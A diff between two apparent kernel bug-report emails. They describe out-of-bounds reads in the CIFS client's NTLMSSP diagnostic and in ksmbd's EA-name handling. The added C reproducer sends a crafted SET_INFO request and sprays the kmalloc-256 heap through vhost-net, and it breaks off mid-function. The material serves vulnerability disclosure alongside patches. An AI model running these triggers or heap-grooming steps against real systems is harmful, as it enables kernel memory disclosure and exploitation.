@@ -1,53 +1,52 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=45.254.49.198
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=45.254.49.197
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1793620744;
-	b=1wbTRbbqwujmhX8IETCCYrk/9NxChEE2YPLPCo20bVPuFVhdLhU3kNBWp0grkHVMzgLj
-	 O3DaFTKGkGwV63BBkDDTcnLl3Ty5bEJ8LU7Cg9ooW8R4iSCAmBcA0oeElvnO6Qt6hJWca
-	 rJBDO7a2anYrKqNctQ0CygdKrCTQ8wcEZ8+LWcCxIdZfaEKmQpjf2faepQ/TcEYPVEt50
-	 XaKQgeh4K5zdgtQOZNwTFPo6DI2twYhhNIyA0Z1JalLqxiSLgZRbJYni5gv5R5uVDgoOG
-	 fcP94UZywZjaSBfJUWuMqfmH/gbUF4NI7lQjOSaYXUEBQlICs9cVyjMGSfh46RH2MJg==
+	t=1793620745;
+	b=LMvT0xtkb0/zTjYnRR7emTKc6HNeBDU+eZPCka9PjloiOuWsJQoaxX/hq7l5q2YRRJ8d
+	 UXMCu0B7I5/WBk3T+pTgIFX2OgRLy5IDjMnGtG8Twx+KyFBwxZzj2PRlq8zhN1l9wEcvp
+	 mKeLYwgNLFVlFBsuJtXxiOjDYd++TAA+qCUB23pFFAUJuJzTPWwkefCkb1lXPeKRZSzfi
+	 uP5+ww5w0upQX7hfdIdMZl6QaRvY2Il6eS7C6OcT9+hxeYIK3n2pkHQDGlUZSDNj1wX6e
+	 QRuq9r8yR+26fOJ41+shhIiUE9h7j/UizIagppwuyZx5ymuXN5Uq5iudRhQ/ymJNYPA==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1793620744;
+	a=rsa-sha256; c=relaxed/relaxed; t=1793620745;
 	h=DMARC-Filter:Received:From:To:Cc:Date:Message-ID:Subject:In-Reply-To:
 	 References:MIME-Version:Content-Type:X-HM-Tid:X-HM-MType:
 	 X-HM-Spam-Status:DKIM-Signature;
-	bh=dQIaalc93xrqr2H7wgh4XYk3pLuWs0bGYI3fzMQYUjI=;
-	b=Vts24+NM5oO+BekQnqx+2MslX3/VWHZKGglN4ZjpX1WOk5t+JCerxAB7HT4zr7p8tPSp
-	 BOdivaObsUd0+FQlkwKXB3irTi1c6ljdwBp9WdUrsQqFTWkq09RhqEiP41Zz5AEj3+10K
-	 zW8h7wqpupXDi1YaxV4dtFnu//ddxC6iJ25QoaTasfUv6ZFbwOFNuJaJ0IdG+/9BaRsJf
-	 Lp/ql4k2dJRp9I/+l9IRYdf3epNGANXdX9Mio+bhAGSolZmf3k5I21BDLUYX/3LHJjb0q
-	 ARmn1LuuzYB8JF+i5qJt70rS8vEWI1AtijD8m6q3yimF15Zp372Eh64SP1mQYaqvK4A==
+	bh=oa8Ddx4QS8s4S9BtkOk9MfE+bEqkDfFEluBCFq91bTU=;
+	b=aT2TDM+/GEBDdjnIv00CI3p5W9e3SJHsAGrgckGeyQgqziXMfmJxD+uuBgNA0NG9q/2v
+	 3In07s6ZSyvcyi5xCMS+4IQp28urCc44tkNd4ZG2Uk+N1mwVx5NwIll/bZKvBDAWOOOPM
+	 NTv0znV9KoT21dP1//2N1Kfd4mPtNHeiJqRIEwB9CvVLVwigVclqC9WL6LQs13g7DFvVb
+	 o6DvSdm0s1BuQ1PbW8kDCfobz11baX5Xfa6V2s4Px4IF0tMBVwXuwaPDBaep5fmyjNK3o
+	 jl7dVLmM8/RUKh1KYSQswrBxp2PP9b9el1mlvNPq1AGnKsKU4FyJkQdStzi7K/m0Mlg==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
 	dmarc=pass header.from=stu.pku.edu.cn;
 	spf=pass smtp.mailfrom=stu.pku.edu.cn;
-	dkim=pass header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=ZaUsZOGA;
-	arc=none smtp.remote-ip=45.254.49.198
-Received: from mail-m49198.qiye.163.com (mail-m49198.qiye.163.com [45.254.49.198])
+	dkim=pass header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=bnojChC6;
+	arc=none smtp.remote-ip=45.254.49.197
+Received: from mail-m49197.qiye.163.com (mail-m49197.qiye.163.com [45.254.49.197])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D42A8606A94F;
-	Mon,  2 Nov 2026 11:59:00 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org D42A8606A94F
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CD78C606A962;
+	Mon,  2 Nov 2026 11:59:01 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org CD78C606A962
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=stu.pku.edu.cn
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=stu.pku.edu.cn
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key, unprotected) header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=ZaUsZOGA
+	dkim=pass (1024-bit key, unprotected) header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=bnojChC6
 Received: from 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa (unknown [1.202.162.49])
-	by smtp.qiye.163.com (Hmail) with ESMTP id 5330b235c;
-	Mon, 2 Nov 2026 19:58:56 +0800 (GMT+08:00)
+	by smtp.qiye.163.com (Hmail) with ESMTP id 5330b235d;
+	Mon, 2 Nov 2026 19:58:58 +0800 (GMT+08:00)
 From: Yifan Zhang <yfzhang23@stu.pku.edu.cn>
-To: Paulo Alcantara <pc@manguebit.org>, linux-cifs@vger.kernel.org
-Cc: Namjae Jeon <linkinjeon@kernel.org>,
- Ronnie Sahlberg <ronniesahlberg@gmail.com>,
- Shyam Prasad N <sprasad@microsoft.com>, Tom Talpey <tom@talpey.com>,
- Bharath SM <bharathsm@microsoft.com>, Steve French <sfrench@us.ibm.com>,
- samba-technical@lists.samba.org, linux-kernel@vger.kernel.org
+To: Namjae Jeon <linkinjeon@kernel.org>,
+ Sergey Senozhatsky <senozhatsky@chromium.org>, linux-cifs@vger.kernel.org
+Cc: Tom Talpey <tom@talpey.com>, ChenXiaoSong <chenxiaosong@chenxiaosong.com>,
+ Steve French <stfrench@microsoft.com>, Ronnie Sahlberg <lsahlber@redhat.com>,
+ Hyunchul Lee <hyc.lee@gmail.com>, linux-kernel@vger.kernel.org
 Date: Mon, 02 Nov 2026 19:58:37 +0800
-Message-ID: <179362071775.29269.10690581159173812284@stu.pku.edu.cn>
-Subject: Re: [PATCH] cifs: bound invalid NTLMSSP signature diagnostic
-In-Reply-To: <179362071771.29269.6848836845989806334@stu.pku.edu.cn>
-References: <179362071771.29269.6848836845989806334@stu.pku.edu.cn>
+Message-ID: <179362071775.29269.3737313972716373343@stu.pku.edu.cn>
+Subject: Re: [PATCH] ksmbd: require NUL-terminated EA names
+In-Reply-To: <179362071772.29269.615878810410303214@stu.pku.edu.cn>
+References: <179362071772.29269.615878810410303214@stu.pku.edu.cn>
 X-Mailing-List: linux-cifs@vger.kernel.org
 List-Id: <linux-cifs.vger.kernel.org>
 List-Post: <mailto:linux-cifs@vger.kernel.org>
@@ -57,50 +56,51 @@ List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:linux-cifs+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============1188433712424754634=="
-X-HM-Tid: 0aa19c207ab303a2kunmab045f0fe8506
+Content-Type: multipart/mixed; boundary="===============3053206820710942250=="
+X-HM-Tid: 0aa19c20803503a2kunmab045f0fe850d
 X-HM-MType: 10
 X-HM-Spam-Status: e1kfGhgUHx5ZQUpXWQgPGg8OCBgUHx5ZQUlOS1dZFg8aDwILHllBWSg2Ly
-	tZV1koWUFITzdXWRgWCB1ZQUpXWS1ZQUlXWQ8JGhUIEh9ZQVkZTU9JVkhPSB9KQhoaTEMfTFYeHw
+	tZV1koWUFITzdXWRgWCB1ZQUpXWS1ZQUlXWQ8JGhUIEh9ZQVlCT0IaVkMZHUtMHksZH0IaHlYeHw
 	5VEwETFhoSFyQUDg9ZV1kYEgtZQVlKVUlLSVVKTUlVT0JZV1kWGg8SFR0UWUFZT0tIVUpLSEpMTU
 	NVSktLVUpCS0tZBg++
 DKIM-Signature: a=rsa-sha256;
-	b=ZaUsZOGApNO4GCp6kSMMQKRTgW8o+OOaCz+kGozjrkEs12AnYnu11RoosH3vmZhTWAPsMLJAKRHFKQkovsVsICRj6Iq6zFmrI34t33DvmREhxM32jXO+SjQtwkjUzMDfyUc2JiP9gObzTQcMjDRe2A/TuxxQ6Z5L7XGELhgyOkk=; s=default; c=relaxed/relaxed; d=stu.pku.edu.cn; v=1;
-	bh=dQIaalc93xrqr2H7wgh4XYk3pLuWs0bGYI3fzMQYUjI=;
+	b=bnojChC66Y7/AtqNw4ipoLJ4pxeh2NPaJiVqAx8GsUnH+CAwMcUOnEGrSJDUFdn4gJUC6nY+PEOV6/5Xs3/y9tS5L1W7yPSslTDjIpB6B1F+11Vq8XMbM+IDV+BtLYCqmIlJaBM41TJ4IGtf0q9DTfMZYIj5jPb0Wr6BY7EvVmY=; s=default; c=relaxed/relaxed; d=stu.pku.edu.cn; v=1;
+	bh=oa8Ddx4QS8s4S9BtkOk9MfE+bEqkDfFEluBCFq91bTU=;
 	h=date:mime-version:subject:message-id:from;
 
---===============1188433712424754634==
+--===============3053206820710942250==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: 7bit
 
 Hello,
 
-I found an out-of-bounds read in decode_ntlmssp_challenge() when an invalid
-NTLMSSP signature is logged. I reproduced it on two independent boots of an
-unmodified Linux v7.3 KASAN kernel. Both runs reported:
+I found an out-of-bounds read in smb2_set_ea() when an EA name is not
+NUL-terminated. I reproduced it on two independent boots of an unmodified
+Linux v7.3 KASAN kernel. Both runs reported:
 
   BUG: KASAN: slab-out-of-bounds in string+0x42b/0x470
   Read of size 1
   string
   vsnprintf
   _printk
-  decode_ntlmssp_challenge
+  smb2_set_ea
+  smb2_set_info
 
-The Signature field is an eight-byte binary value and is not required to be
-NUL-terminated. On mismatch, decode_ntlmssp_challenge() prints it with %s, so
-the diagnostic continues reading beyond the received blob until it finds a
-zero byte.
+smb2_set_ea() checks that the byte reserved for the EA-name terminator lies
+inside the request, but does not check that the byte is zero. With SMB debug
+logging enabled, the name is passed to %s and the diagnostic continues
+reading beyond the request allocation.
 
-The attached C program runs a loopback SMB3 server and invokes the CIFS
-client mount path:
+The attached reproducer starts the minimal ksmbd userspace control plane and
+sends the SET_INFO request over loopback:
 
-  cc -O2 -static repro.c -o repro
+  cc -O2 -static -pthread repro.c -o repro
   ./repro
 
 Both runs used copies of the default syzkaller ext4 image.
 
-The attached patch prints the fixed-width field with %8phN. The patched
-kernel reaches the invalid-signature path and returns EINVAL without a KASAN
+The attached patch rejects an EA entry whose declared terminator byte is
+nonzero. The patched kernel returns STATUS_INVALID_PARAMETER without a KASAN
 report.
 
 The patch is in the parent message. The reproducer source(s), KASAN
@@ -109,830 +109,1482 @@ report(s), and kernel config are attached.
 Regards,
 Yifan Zhang
 
---===============1188433712424754634==
+--===============3053206820710942250==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: 7bit
 Content-Disposition: attachment; filename="repro.c"
 MIME-Version: 1.0
 
-#define _GNU_SOURCE
-#include <arpa/inet.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <netinet/in.h>
-#include <net/if.h>
-#include <signal.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mount.h>
-#include <sys/ioctl.h>
-#include <sys/socket.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <unistd.h>
+#define main ksmbd_base_main
+#include "ksmbd-base.c"
+#undef main
 
-#define TEST_PORT 1445
-#define NEGOTIATE 0
-#define SESSION_SETUP 1
-#define ECHO 13
+#include <linux/vhost.h>
 
-#define SMB2_PROTO 0x424d53feU
-#define SMB2_FLAGS_SERVER_TO_REDIR 0x00000001U
-#define STATUS_MORE_PROCESSING_REQUIRED 0xc0000016U
-#define SMB30_DIALECT 0x0300
+#define SMB2_SET_INFO 17
 
-/* Default cifs.ko value: 16 KiB payload plus the SMB2 maximum header. */
-#define CIFS_MAX_BUF (16U * 1024U)
-#define MAX_SMB2_HDR 204U
-#define GIANT_PDU (CIFS_MAX_BUF + MAX_SMB2_HDR)
-#define CHALLENGE_LEN 8192U
-
-struct smb2_hdr {
-	uint32_t protocol;
-	uint16_t structure_size;
-	uint16_t credit_charge;
-	uint32_t status;
-	uint16_t command;
-	uint16_t credits;
-	uint32_t flags;
-	uint32_t next_command;
-	uint64_t message_id;
-	uint32_t process_id;
-	uint32_t tree_id;
-	uint64_t session_id;
-	uint8_t signature[16];
-} __attribute__((packed));
-
-struct negotiate_rsp {
-	struct smb2_hdr hdr;
-	uint16_t structure_size;
-	uint16_t security_mode;
-	uint16_t dialect;
-	uint16_t context_count;
-	uint8_t server_guid[16];
-	uint32_t capabilities;
-	uint32_t max_transact;
-	uint32_t max_read;
-	uint32_t max_write;
-	uint64_t system_time;
-	uint64_t server_start_time;
-	uint16_t security_buffer_offset;
-	uint16_t security_buffer_length;
-	uint32_t negotiate_context_offset;
-} __attribute__((packed));
-
-struct session_setup_rsp {
-	struct smb2_hdr hdr;
-	uint16_t structure_size;
-	uint16_t session_flags;
-	uint16_t security_buffer_offset;
-	uint16_t security_buffer_length;
-} __attribute__((packed));
-
-struct echo_rsp {
-	struct smb2_hdr hdr;
-	uint16_t structure_size;
-	uint16_t reserved;
-} __attribute__((packed));
-
-static void die(const char *what)
+static void *writable_ipc_thread(void *arg)
 {
-	perror(what);
-	exit(1);
-}
+	int family = (int)(long)arg;
+	char buf[8192];
+	struct timeval tv = { .tv_sec = 1 };
 
-static void bring_loopback_up(void)
-{
-	struct ifreq ifr;
-	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+	setsockopt(nl_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+	ipc_running = 1;
+	while (ipc_running) {
+		ssize_t n = recv(nl_fd, buf, sizeof(buf), 0);
+		struct nlmsghdr *nlh;
+		struct genlmsghdr *gnl;
+		struct nlattr *a;
+		void *payload = NULL;
+		int rem, plen = 0, cmd;
 
-	if (fd < 0)
-		die("socket ioctl");
-	memset(&ifr, 0, sizeof(ifr));
-	strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
-	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
-		die("SIOCGIFFLAGS");
-	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
-	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
-		die("SIOCSIFFLAGS");
-	close(fd);
-}
-
-static void read_full(int fd, void *buf, size_t len)
-{
-	uint8_t *p = buf;
-
-	while (len) {
-		ssize_t n = read(fd, p, len);
-		if (n == 0) {
-			fprintf(stderr, "peer closed connection\n");
-			exit(1);
+		if (n < (ssize_t)sizeof(struct nlmsghdr))
+			continue;
+		nlh = (struct nlmsghdr *)buf;
+		if (nlh->nlmsg_type != family)
+			continue;
+		gnl = (struct genlmsghdr *)NLMSG_DATA(nlh);
+		cmd = gnl->cmd;
+		a = (struct nlattr *)((char *)gnl + sizeof(*gnl));
+		rem = nlh->nlmsg_len - NLMSG_LENGTH(sizeof(*gnl));
+		while (NLA_OK(a, rem)) {
+			payload = (char *)a + NLA_HDRLEN;
+			plen = a->nla_len - NLA_HDRLEN;
+			a = NLA_NEXT(a, rem);
 		}
-		if (n < 0) {
-			if (errno == EINTR)
-				continue;
-			die("read");
+		if (!payload)
+			continue;
+
+		if (cmd == KSMBD_EVENT_LOGIN_REQUEST &&
+		    plen >= (int)sizeof(struct ksmbd_login_request)) {
+			struct ksmbd_login_request *lr = payload;
+			struct ksmbd_login_response resp = {};
+
+			resp.handle = lr->handle;
+			resp.gid = 0;
+			resp.uid = 0;
+			memcpy(resp.account, lr->account, sizeof(resp.account));
+			resp.status = KSMBD_USER_FLAG_OK |
+				      KSMBD_USER_FLAG_GUEST_ACCOUNT;
+			resp.hash_sz = 16;
+			memset(resp.hash, 0x11, 16);
+			nl_send_resp(family, KSMBD_EVENT_LOGIN_RESPONSE,
+				     &resp, sizeof(resp));
+		} else if (cmd == KSMBD_EVENT_SHARE_CONFIG_REQUEST &&
+			   plen >= (int)sizeof(struct ksmbd_share_config_request)) {
+			struct ksmbd_share_config_request *sr = payload;
+			char sresp[2048] = {};
+			struct ksmbd_share_config_response *resp = (void *)sresp;
+			const char path[] = "/tmp";
+
+			resp->handle = sr->handle;
+			resp->flags = KSMBD_SHARE_FLAG_AVAILABLE |
+				      KSMBD_SHARE_FLAG_WRITEABLE |
+				      KSMBD_SHARE_FLAG_GUEST_OK;
+			resp->create_mask = 0666;
+			resp->directory_mask = 0777;
+			strcpy((char *)resp->share_name, "TEST");
+			resp->payload_sz = sizeof(path);
+			memcpy(sresp + sizeof(*resp), path, sizeof(path));
+			nl_send_resp(family, KSMBD_EVENT_SHARE_CONFIG_RESPONSE,
+				     sresp, sizeof(*resp) + sizeof(path));
+		} else if (cmd == KSMBD_EVENT_TREE_CONNECT_REQUEST &&
+			   plen >= (int)sizeof(struct ksmbd_tree_connect_request)) {
+			struct ksmbd_tree_connect_request *tr = payload;
+			struct ksmbd_tree_connect_response resp = {};
+
+			resp.handle = tr->handle;
+			resp.status = 0;
+			resp.connection_flags = 0x1 | 0x4; /* guest | writable */
+			nl_send_resp(family, KSMBD_EVENT_TREE_CONNECT_RESPONSE,
+				     &resp, sizeof(resp));
 		}
-		p += n;
-		len -= (size_t)n;
 	}
+	return NULL;
 }
 
-static void write_full(int fd, const void *buf, size_t len)
+static size_t build_create_ea_target(uint8_t *buf)
 {
-	const uint8_t *p = buf;
+	static const uint16_t name[] = {
+		'e', 'a', '_', 't', 'a', 'r', 'g', 'e', 't'
+	};
+	uint8_t *hdr, *p;
 
-	while (len) {
-		ssize_t n = write(fd, p, len);
-		if (n < 0) {
-			if (errno == EINTR)
-				continue;
-			die("write");
-		}
-		p += n;
-		len -= (size_t)n;
+	memset(buf, 0, 512);
+	put_hdr(buf, SMB2_CREATE, cur_mid++, 0);
+	hdr = buf + 4;
+	p = hdr + 64;
+	*(uint16_t *)p = 57; p += 2;
+	*p++ = 0;
+	*p++ = 0;
+	*(uint32_t *)p = 0; p += 4;
+	memset(p, 0, 16); p += 16;
+	*(uint32_t *)p = 0x0012019f; p += 4;
+	*(uint32_t *)p = 0; p += 4;
+	*(uint32_t *)p = 7; p += 4;
+	*(uint32_t *)p = 3; p += 4; /* FILE_OPEN_IF */
+	*(uint32_t *)p = 0; p += 4;
+	*(uint16_t *)p = 120; p += 2;
+	*(uint16_t *)p = sizeof(name); p += 2;
+	*(uint32_t *)p = 0; p += 4;
+	*(uint32_t *)p = 0; p += 4;
+	memcpy(p, name, sizeof(name));
+	p += sizeof(name);
+	return (size_t)(p - buf) - 4;
+}
+
+static size_t build_set_ea_no_nul(uint8_t *buf, uint64_t persistent,
+				   uint64_t volatile_id)
+{
+	uint8_t *hdr, *p, *ea;
+	const unsigned int name_len = 111;
+	const unsigned int value_len = 8;
+	const unsigned int ea_len = 8 + name_len + 1 + value_len;
+
+	memset(buf, 0x41, 1024);
+	put_hdr(buf, SMB2_SET_INFO, cur_mid++, 0);
+	hdr = buf + 4;
+	p = hdr + 64;
+	*(uint16_t *)p = 33; p += 2;
+	*p++ = 1;  /* SMB2_O_INFO_FILE */
+	*p++ = 15; /* FILE_FULL_EA_INFORMATION */
+	*(uint32_t *)p = ea_len; p += 4;
+	*(uint16_t *)p = 96; p += 2;
+	*(uint16_t *)p = 0; p += 2;
+	*(uint32_t *)p = 0; p += 4;
+	*(uint64_t *)p = persistent; p += 8;
+	*(uint64_t *)p = volatile_id; p += 8;
+
+	ea = p;
+	*(uint32_t *)(ea + 0) = 0;
+	ea[4] = 0;
+	ea[5] = name_len;
+	*(uint16_t *)(ea + 6) = value_len;
+	memset(ea + 8, 'A', name_len);
+	ea[8 + name_len] = 'X'; /* required NUL slot: deliberately non-NUL */
+	memset(ea + 8 + name_len + 1, 'V', value_len);
+	p += ea_len;
+	return (size_t)(p - buf) - 4;
+}
+
+static int prime_kmalloc_256(void)
+{
+	struct {
+		uint32_t nregions;
+		uint32_t padding;
+		struct vhost_memory_region regions[7];
+	} mem;
+	char mapped[4096] __attribute__((aligned(4096)));
+	int fd, i, round;
+
+	fd = open("/dev/vhost-net", O_RDWR);
+	if (fd < 0) {
+		perror("open vhost-net");
+		return -1;
 	}
-}
-
-static uint8_t *recv_smb(int fd, uint32_t *len_out)
-{
-	uint32_t be_len, len;
-	uint8_t *buf;
-
-	read_full(fd, &be_len, sizeof(be_len));
-	len = ntohl(be_len) & 0x00ffffffU;
-	if (len < sizeof(struct smb2_hdr) || len > 1024U * 1024U) {
-		fprintf(stderr, "bad request length %u\n", len);
-		exit(1);
+	if (ioctl(fd, VHOST_SET_OWNER, 0) < 0)
+		perror("VHOST_SET_OWNER");
+	mem.nregions = 7;
+	mem.padding = 0;
+	for (i = 0; i < 7; i++) {
+		mem.regions[i].guest_phys_addr = 0x1000ULL * (i + 1);
+		mem.regions[i].memory_size = 0x1000;
+		mem.regions[i].userspace_addr = (uintptr_t)mapped;
+		mem.regions[i].flags_padding = 0x5a5a5a5a5a5a5a5aULL;
 	}
-	buf = malloc(len);
-	if (!buf)
-		die("malloc");
-	read_full(fd, buf, len);
-	*len_out = len;
-	return buf;
+	for (round = 0; round < 200000; round++)
+		(void)ioctl(fd, VHOST_SET_MEM_TABLE, &mem);
+	fprintf(stderr, "primed kmalloc-256 with 200000 vhost memory tables\n");
+	return fd;
 }
 
-static void send_smb(int fd, const void *buf, uint32_t len)
+static void enable_ksmbd_smb_debug(void)
 {
-	uint32_t be_len = htonl(len);
+	int fd = open("/sys/class/ksmbd-control/debug", O_WRONLY);
 
-	write_full(fd, &be_len, sizeof(be_len));
-	write_full(fd, buf, len);
-}
-
-static void fill_hdr(struct smb2_hdr *hdr, uint16_t command,
-		     uint64_t message_id, uint32_t status)
-{
-	hdr->protocol = SMB2_PROTO;
-	hdr->structure_size = 64;
-	hdr->status = status;
-	hdr->command = command;
-	hdr->credits = 128;
-	hdr->flags = SMB2_FLAGS_SERVER_TO_REDIR;
-	hdr->message_id = message_id;
-	hdr->session_id = command == NEGOTIATE ? 0 : 1;
-}
-
-static void send_negotiate(int fd, uint64_t mid)
-{
-	uint8_t *buf = malloc(GIANT_PDU);
-	struct negotiate_rsp *rsp;
-
-	if (!buf)
-		die("malloc negotiate");
-	memset(buf, 'A', GIANT_PDU);
-	memset(buf, 0, sizeof(*rsp));
-	rsp = (struct negotiate_rsp *)buf;
-	fill_hdr(&rsp->hdr, NEGOTIATE, mid, 0);
-	rsp->structure_size = 65;
-	rsp->security_mode = 1;
-	rsp->dialect = SMB30_DIALECT;
-	memset(rsp->server_guid, 0x42, sizeof(rsp->server_guid));
-	rsp->capabilities = 4; /* SMB2_GLOBAL_CAP_LARGE_MTU */
-	rsp->max_transact = 1024U * 1024U;
-	rsp->max_read = 1024U * 1024U;
-	rsp->max_write = 1024U * 1024U;
-	/* No security blob asks the client to use raw NTLMSSP. */
-	rsp->security_buffer_offset = 0;
-	rsp->security_buffer_length = 0;
-	send_smb(fd, buf, GIANT_PDU);
-	free(buf);
-}
-
-/*
- * No MID matches this response.  The demultiplex thread therefore retains
- * the large receive buffer.  Its padding fills that whole object with bytes
- * that are nonzero, then the next receive only clears/overwrites the prefix.
- */
-static void send_giant_unsolicited_echo(int fd, uint64_t mid)
-{
-	uint8_t *buf = malloc(GIANT_PDU);
-	struct echo_rsp *rsp;
-
-	if (!buf)
-		die("malloc echo");
-	memset(buf, 'B', GIANT_PDU);
-	memset(buf, 0, sizeof(*rsp));
-	rsp = (struct echo_rsp *)buf;
-	fill_hdr(&rsp->hdr, ECHO, mid + 0x100000, 0);
-	rsp->structure_size = 4;
-	send_smb(fd, buf, GIANT_PDU);
-	free(buf);
-}
-
-static void send_bad_challenge(int fd, uint64_t mid)
-{
-	uint32_t len = sizeof(struct session_setup_rsp) + CHALLENGE_LEN;
-	uint8_t *buf = malloc(len);
-	struct session_setup_rsp *rsp;
-
-	if (!buf)
-		die("malloc challenge");
-	memset(buf, 'C', len);
-	memset(buf, 0, sizeof(*rsp));
-	rsp = (struct session_setup_rsp *)buf;
-	fill_hdr(&rsp->hdr, SESSION_SETUP, mid,
-		 STATUS_MORE_PROCESSING_REQUIRED);
-	rsp->structure_size = 9;
-	rsp->security_buffer_offset = sizeof(*rsp);
-	rsp->security_buffer_length = CHALLENGE_LEN;
-	/* Buffer begins with "CCCCCCCC", deliberately not "NTLMSSP\\0". */
-	send_smb(fd, buf, len);
-	free(buf);
-}
-
-static void run_server(int listen_fd)
-{
-	int fd;
-	uint8_t *req;
-	uint32_t len;
-	struct smb2_hdr *hdr;
-	uint64_t session_mid;
-
-	fd = accept(listen_fd, NULL, NULL);
-	if (fd < 0)
-		die("accept");
-
-	req = recv_smb(fd, &len);
-	hdr = (struct smb2_hdr *)req;
-	if (hdr->protocol != SMB2_PROTO || hdr->command != NEGOTIATE) {
-		fprintf(stderr, "expected SMB2 NEGOTIATE\n");
-		exit(1);
+	if (fd < 0) {
+		perror("open ksmbd debug");
+		return;
 	}
-	send_negotiate(fd, hdr->message_id);
-	free(req);
-
-	req = recv_smb(fd, &len);
-	hdr = (struct smb2_hdr *)req;
-	if (hdr->protocol != SMB2_PROTO || hdr->command != SESSION_SETUP) {
-		fprintf(stderr, "expected SMB2 SESSION_SETUP, got command %u\n",
-			hdr->command);
-		exit(1);
-	}
-	session_mid = hdr->message_id;
-	free(req);
-
-	send_giant_unsolicited_echo(fd, session_mid);
-	send_bad_challenge(fd, session_mid);
-
-	/* Keep the transport alive while KASAN prints the report. */
-	sleep(30);
+	if (write(fd, "smb\n", 4) != 4)
+		perror("write ksmbd debug");
 	close(fd);
 }
 
 int main(void)
 {
-	struct sockaddr_in addr = {
-		.sin_family = AF_INET,
-		.sin_port = htons(TEST_PORT),
-		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
-	};
-	int one = 1, listen_fd;
-	pid_t child;
+	uint8_t buf[4096], rbuf[8192];
+	uint64_t persistent, volatile_id;
+	ssize_t rn;
+	size_t n;
+	int fam, fd;
+	pthread_t tid;
 
-	bring_loopback_up();
-	listen_fd = socket(AF_INET, SOCK_STREAM, 0);
-	if (listen_fd < 0)
-		die("socket");
-	setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
-	if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
-		die("bind");
-	if (listen(listen_fd, 1) < 0)
-		die("listen");
+	nl_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+	if (nl_fd < 0)
+		return 1;
+	fam = genl_family_id();
+	if (fam < 0 || start_ksmbd(fam) < 0)
+		return 2;
+	pthread_create(&tid, NULL, writable_ipc_thread, (void *)(long)fam);
+	usleep(200000);
 
-	mkdir("/tmp/cifs-ntlmssp-oob", 0700);
-	child = fork();
-	if (child < 0)
-		die("fork");
-	if (child == 0) {
-		const char opts[] =
-			"vers=3.0,sec=ntlmssp,username=u,password=p,"
-			"port=1445,noserverino,soft";
-
-		close(listen_fd);
-		if (mount("//127.0.0.1/share", "/tmp/cifs-ntlmssp-oob",
-			  "cifs", 0, opts) < 0)
-			perror("mount");
-		_exit(0);
+	{
+		int s = socket(AF_INET, SOCK_DGRAM, 0);
+		struct ifreq ifr = {};
+		strcpy(ifr.ifr_name, "lo");
+		ioctl(s, SIOCGIFFLAGS, &ifr);
+		ifr.ifr_flags |= IFF_UP;
+		ioctl(s, SIOCSIFFLAGS, &ifr);
+		close(s);
 	}
+	usleep(300000);
+	enable_ksmbd_smb_debug();
+	sleep(2);
 
-	run_server(listen_fd);
-	kill(child, SIGKILL);
-	waitpid(child, NULL, 0);
+	fd = reconnect_guest();
+	if (fd < 0)
+		return 3;
+
+	n = build_create_ea_target(buf);
+	smb_send(fd, buf, n);
+	rn = smb_recv(fd, rbuf, sizeof(rbuf));
+	if (rn < 4 + 144 || *(uint32_t *)(rbuf + 12)) {
+		fprintf(stderr, "CREATE failed: rn=%zd status=%08x\n", rn,
+			rn >= 16 ? *(uint32_t *)(rbuf + 12) : 0xffffffffu);
+		return 4;
+	}
+	persistent = *(uint64_t *)(rbuf + 4 + 128);
+	volatile_id = *(uint64_t *)(rbuf + 4 + 136);
+	fprintf(stderr, "CREATE fid=(%llu,%llu)\n",
+		(unsigned long long)persistent,
+		(unsigned long long)volatile_id);
+
+	{
+		int vhost_fd = prime_kmalloc_256();
+		(void)vhost_fd; /* Keep the vhost object alive through the trigger. */
+	}
+	n = build_set_ea_no_nul(buf, persistent, volatile_id);
